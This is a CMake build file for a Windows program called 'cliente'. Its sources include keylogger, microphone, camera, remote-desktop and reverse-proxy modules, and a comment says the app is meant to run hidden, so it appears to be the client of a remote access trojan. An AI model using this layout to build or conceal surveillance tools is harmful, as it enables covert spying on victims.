cmake_minimum_required(VERSION 3.14 FATAL_ERROR)

project(cliente LANGUAGES CXX C)
 
set(CMAKE_CXX_STANDARD 11)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
#set(CMAKE_CXX_FLAGS "-fsanitize=address")
#set(CMAKE_EXE_LINKER_FLAGS " -static")
#set(CMAKE_CXX_COMPILER x86_64-w64-mingw32-gcc )
#set(CMAKE_CXX_FLAGS "-Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic " )
#set(CMAKE_BUILD_TYPE Debug)
#include_directories("../lzo/include/")

set(COMMON_FLAGS "-Os -s -ffunction-sections -fdata-sections -fno-exceptions -fno-rtti -static-libgcc -static-libstdc++")
set(LINKER_FLAGS "-static -Wl,--gc-sections -Wl,-Bstatic -Wl,-s -Wl,-Bdynamic")

set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} ${COMMON_FLAGS}")
set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} ${COMMON_FLAGS}")
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} ${LINKER_FLAGS}")

set(SRCS main.cpp
         misc.cpp
         cliente.cpp 
         mod_reverse_proxy.cpp
         mod_mic.cpp
         mod_camara.cpp
         mod_file_manager.cpp
         mod_keylogger.cpp
         mod_mic.cpp
         mod_remote_desktop.cpp
         mod_ventanas.cpp
         mod_info.cpp
         mod_escaner.cpp
         mod_fun.cpp
         mod_dynamic_load.cpp
         ../base64/base64.cpp
         ../sqlite3/sqlite3.c
         ../aes256/aes256.cpp
         ../zlib/compress.c 
         ../zlib/inflate.c 
         ../zlib/infback.c 
         ../zlib/inftrees.c 
         ../zlib/trees.c 
         ../zlib/inffast.c 
         ../zlib/adler32.c 
         ../zlib/deflate.c 
         ../zlib/crc32.c 
         ../zlib/zutil.c 
         ../zlib/uncompr.c
)

#set_target_properties(cliente PROPERTIES LINK_FLAGS "/SUBSYSTEM:CONSOLE")

#agregar win32 para hacer la app oculta 
add_executable(cliente ${SRCS})

target_link_libraries(cliente PRIVATE wsock32 ws2_32 mfuuid wmcodecdspuuid gdiplus iphlpapi)

set_target_properties(cliente PROPERTIES LINK_FLAGS "/SUBSYSTEM:CONSOLE")
#target_link_libraries(cliente PRIVATE netapi32 wsock32 ws2_32 mf mfplat mfreadwrite mfuuid wmcodecdspuuid strmiids ole32 uuid gdiplus shlwapi crypt32 bcrypt iphlpapi)
#target_link_libraries(cliente PRIVATE netapi32 wsock32 ws2_32 mf mfplat mfreadwrite mfuuid wmcodecdspuuid ole32 strmiids uuid winmm wtsapi32 gdi32 gdiplus shlwapi crypt32 bcrypt iphlpapi)
